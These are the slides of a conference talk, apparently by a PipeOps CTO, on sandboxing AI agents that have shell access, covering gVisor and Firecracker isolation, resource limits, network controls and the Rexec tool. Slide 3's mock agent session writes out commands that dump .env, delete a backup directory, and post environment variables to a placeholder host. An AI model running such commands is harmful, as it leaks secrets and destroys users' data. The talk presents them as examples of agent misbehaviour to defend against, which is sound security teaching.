---
layout: talk
title: How to Safely Give AI Agents a Terminal
description: >-
  Giving an agent a shell is useful. Giving it your machine is not. How to
  reason about security, enforce limits, control network access, and build
  disposable terminals - lessons from Rexec. Live demo.
permalink: /talks/sysconf-2026/
event: SysConf 2026
slot: "Sat 3 Oct · 12:25-12:55 WAT · Room 1 · Standard 30m"
talk_date: 2026-10-03
# Public teaser while talk_date is in the future. Speaker: ?key= or unlock form.
speaker_key: sysconf-2026-rexec
blog: /blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal
repo: https://github.com/PipeOpsHQ/Rexec
image: /assets/images/nitrocode-og-v2.png
---

<div class="talk-intro">
  <p class="eyebrow">SysConf 2026 · Standard</p>
  <h1>How to Safely Give AI Agents a Terminal</h1>
  <div class="talk-intro__meta">
    <p>Alex Idowu · Co-founder &amp; CTO, PipeOps · Lagos</p>
    <p><strong>Sat 3 Oct 2026 · 12:25-12:55 WAT · Room 1</strong><br>
    25 min talk + 5 min Q&amp;A · live Rexec sandbox demo</p>
    <p>
      Field notes:
      <a href="/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal">blog post</a>
      ·
      <a href="https://github.com/PipeOpsHQ/Rexec" target="_blank" rel="noopener">Rexec</a>
    </p>
  </div>
  <p class="talk-keys">Present · <kbd>P</kbd> or button · Navigate <kbd>→</kbd> <kbd>←</kbd> · Esc exits · Deep link <code>?present=1</code></p>
</div>

<section class="talk-slide talk-slide--elbaph is-active" id="s01" data-slide="1">
  <div class="talk-elbaph" aria-hidden="true">
    <img
      class="talk-elbaph__art"
      src="{{ '/assets/talks/elbaph-ghibli.jpg?v=' | append: site.asset_version | relative_url }}"
      alt=""
      width="1280"
      height="720"
      loading="eager"
      decoding="async"
    />
  </div>
  <div class="talk-slide__fore">
    <p class="talk-slide__label">01 · Title</p>
    <h2>How to Safely Give AI Agents a Terminal</h2>
    <p>Alex Idowu · PipeOps · Lagos</p>
    <p class="ok">SysConf 2026 · Room 1</p>
  </div>
</section>

<section class="talk-slide" id="s02" data-slide="2">
  <p class="talk-slide__label">02 · Problem</p>
  <div class="talk-split">
    <div class="talk-split__main">
      <h2>Giving an agent a shell is useful.<br>Giving it your machine is not.</h2>
      <p>Agents that run commands are common. <strong>Unrestricted shell access</strong> on a laptop, bastion, or shared runner is still the default.</p>
      <p class="punch">The mistake is the blast radius - not the shell.</p>
    </div>
    <aside class="talk-prompt-joke" aria-label="Joke: the usual control plane">
      <p class="talk-prompt-joke__tag">system prompt</p>
      <pre class="talk-prompt-joke__body">You are a careful coding agent.

NEVER delete files.
NEVER read ~/.ssh or ~/.kube.
NEVER exfiltrate secrets.
NEVER curl | bash.
NEVER phone home.
Always ask before anything scary.

(You have full shell access.)</pre>
      <p class="talk-prompt-joke__footer">
        <span class="talk-prompt-joke__dialog">Dialog:</span> Approve tool use?
        <span class="talk-prompt-joke__btns">[ Allow once ] [ Always allow ]</span>
      </p>
      <p class="talk-prompt-joke__caption">This is not a control plane.</p>
    </aside>
  </div>
</section>

<section class="talk-slide" id="s03" data-slide="3">
  <p class="talk-slide__label">03 · Why the default fails</p>
  <div class="talk-split">
    <div class="talk-split__main">
      <h2>Why the default fails</h2>
      <ul>
        <li>Secrets land on disk</li>
        <li>Creative <code>rm</code> / path expansion</li>
        <li>Env leaves over HTTPS or DNS</li>
        <li>Packages phone home</li>
        <li><code>~/.kube</code> (Kubernetes credentials) and other prod creds sit next to the agent</li>
      </ul>
      <p>No jailbreak required. Models thrash. Hope is not a control.</p>
    </div>
    <aside class="talk-prompt-joke" aria-label="Joke: agent session on your laptop">
      <p class="talk-prompt-joke__tag">agent · localhost</p>
      <pre class="talk-prompt-joke__body">$ cat .env >> /tmp/debug.txt
$ rm -rf "$PROJECT"/../backup
$ curl -s https://example.test/hook -d "$(env)"
$ npm i -g everything
# still exploring…

Approve tool use?  →  Always allow ✓</pre>
      <p class="talk-prompt-joke__caption">No jailbreak. Just Tuesday.</p>
    </aside>
  </div>
</section>

<section class="talk-slide" id="s04" data-slide="4">
  <p class="talk-slide__label">04 · What this talk answers</p>
  <div class="talk-split">
    <div class="talk-split__main">
      <h2>What this talk answers</h2>
      <p>From building <strong>Rexec</strong> - an open-source control plane for disposable, network-isolated Linux terminals (cloud or your own machines):</p>
      <ol>
        <li>How do you <strong>reason about security</strong>?</li>
        <li>How do you <strong>enforce resource limits</strong>?</li>
        <li>How do you <strong>control network access</strong>?</li>
        <li>How do you <strong>build</strong> a tool like that?</li>
      </ol>
      <p class="ok">Isolation + lifecycle. Not a prompting talk.</p>
    </div>
    <aside class="talk-prompt-joke" aria-label="Joke: wrong talk vs this talk">
      <p class="talk-prompt-joke__tag">not on the agenda</p>
      <pre class="talk-prompt-joke__body">✗ Better system prompts
✗ Temperature = 0
✗ “Please be careful”
✗ Tool-use etiquette tips

✓ Isolation
✓ Resource limits
✓ Network control
✓ Lifecycle (create → delete)</pre>
      <p class="talk-prompt-joke__caption">Come for the answers. Stay for the sandbox.</p>
    </aside>
  </div>
</section>

<section class="talk-slide" id="s05" data-slide="5">
  <p class="talk-slide__label">05 · Security + limits</p>
  <h2>Security and resource limits</h2>
  <div class="talk-grid">
    <div class="talk-card">
      <strong>Reason about isolation</strong>
      <span>
        <strong>cgroup</strong> = Linux resource controls. <strong>caps</strong> = Linux capabilities (what root-like powers a process keeps).<br><br>
        Ladder: cgroup + caps → <strong>gVisor</strong> (<code>runsc</code> = its OCI runtime; user-space kernel between container and host - my default) → <strong>Firecracker</strong> (microVM, own guest kernel) → dedicated node.<br><br>
        Stock containers share the host kernel. Name the rung.
      </span>
    </div>
    <div class="talk-card">
      <strong>Enforce limits</strong>
      <span>Hard CPU / memory / PID caps. Concurrency caps + <strong>TTL</strong> (time-to-live - kill the sandbox on a timer). Thrashing agents are a DoS on yourself. Limits = security, not just FinOps.</span>
    </div>
  </div>
  <p class="punch">Trade-off I made in Rexec: needed density on shared hosts and hosts without KVM → gVisor default. Pay syscall/compat tax. Escalate to Firecracker when the threat model says so.</p>
</section>

<section class="talk-slide" id="s06" data-slide="6">
  <p class="talk-slide__label">06 · Network + lifecycle</p>
  <h2>Network access and lifecycle</h2>
  <div class="talk-grid">
    <div class="talk-card">
      <strong>Control the network</strong>
      <span>
        A shell is a network endpoint. Peer traffic, cloud metadata, HTTPS, DNS, demo ports.<br><br>
        Pick at create: <strong>none</strong> · <strong>allowlist</strong> · <strong>full</strong> (you accepted the leak).<br><br>
        <strong>ICC</strong> = inter-container communication on a Docker bridge. ICC off ≠ “no internet” - it only stops sandbox-to-sandbox on that bridge.
      </span>
    </div>
    <div class="talk-card">
      <strong>Lifecycle</strong>
      <span>Create → short-lived secrets → run → attach if needed → <strong>delete</strong>. Long-lived sandboxes become bastions with worse accountability.</span>
    </div>
  </div>
</section>

<section class="talk-slide" id="s07" data-slide="7">
  <p class="talk-slide__label">07 · Building Rexec</p>
  <h2>How you build something like Rexec</h2>
  <div class="talk-code">Agent / CLI / UI
        │  API or WebSocket
        ▼
   Control plane   (create / exec / delete · quotas · network mode)
        │
        ├── Cloud terminal → container + gVisor + caps + isolated bridge
        └── BYOS           → outbound agent on your machine (no inbound SSH)</div>
  <p><strong>BYOS</strong> = bring your own server - real GPU/lab box; mediated access, not a jail.</p>
  <p>Steal the shape without our code: Kubernetes <strong>Jobs</strong> + <strong>RuntimeClass</strong> (pick <code>runsc</code> / Firecracker per pod) + <strong>NetworkPolicy</strong>.</p>
  <p class="punch">Failures I’ve hit: Docker socket in the sandbox, full egress by default, no TTL, prompt-as-boundary, gVisor in README / runc in prod.</p>
</section>

<section class="talk-slide" id="s08" data-slide="8">
  <p class="talk-slide__label">08 · Live demo</p>
  <h2>Live: create → prove controls → delete</h2>
  <ol>
    <li>Create (limits + network mode)</li>
    <li>Show the block - egress or peer</li>
    <li>Run something agent-shaped</li>
    <li><strong>Delete</strong></li>
  </ol>
  <div class="talk-code">rexec sandbox create --network none
# show the failure / block
rexec sandbox delete</div>
  <p>Wifi bad? Same four steps on screenshots.</p>
</section>

<section class="talk-slide" id="s09" data-slide="9">
  <p class="talk-slide__label">09 · Steal this + close</p>
  <h2>Steal this</h2>
  <ol>
    <li>No agent shell on laptops for secrets / prod</li>
    <li>One sandbox per task - then delete</li>
    <li>gVisor or stronger for untrusted agent code</li>
    <li>Egress on purpose; treat DNS as data</li>
    <li>Hard caps + TTL; outbound over inbound SSH for real boxes</li>
  </ol>
  <p class="punch">Giving an agent a shell is useful. Giving it your machine is not.</p>
  <div class="talk-code">github.com/PipeOpsHQ/Rexec
/blog/2026/08/11/how-to-safely-give-ai-agents-a-terminal</div>
  <p>Questions? · Alex Idowu · @nitrocode</p>
</section>
